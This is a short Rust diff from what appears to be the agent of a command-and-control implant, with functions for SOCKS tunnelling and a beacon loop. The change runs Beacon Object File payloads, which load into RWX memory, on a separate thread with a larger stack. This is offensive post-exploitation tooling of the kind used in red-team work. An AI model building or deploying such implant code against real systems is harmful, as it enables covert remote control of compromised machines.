@@ -719,9 +719,23 @@ fn do_socks(chan: u32, op: u8, addr: &str, port: u16) -> Response {
 fn bof_execute(blob: &[u8]) -> Response {
     #[cfg(target_os = "windows")]
     {
-        match nyx_bof_runner::execute(blob) {
-            Ok(r) => Response::BofOutput(r.output.into_bytes()),
-            Err(e) => Response::Err(format!("bof: {e}")),
+        // BOF execution runs in RWX memory + calls externals through COFF
+        // relocations. The agent's main beacon-loop thread may already have a
+        // deep call stack (tokio/ureq/serde), so running the BOF inline can
+        // overflow the default 1 MiB Windows thread stack. Spawn a fresh thread
+        // with a generous 4 MiB stack to give the BOF + Beacon-API shim plenty
+        // of headroom.
+        let blob_owned = blob.to_vec();
+        match std::thread::Builder::new()
+            .stack_size(4 * 1024 * 1024)
+            .spawn(move || nyx_bof_runner::execute(&blob_owned))
+        {
+            Ok(handle) => match handle.join() {
+                Ok(Ok(r)) => Response::BofOutput(r.output.into_bytes()),
+                Ok(Err(e)) => Response::Err(format!("bof: {e}")),
+                Err(_) => Response::Err("bof: thread panicked".into()),
+            },
+            Err(e) => Response::Err(format!("bof: failed to spawn thread: {e}")),
         }
     }
     #[cfg(not(target_os = "windows"))]
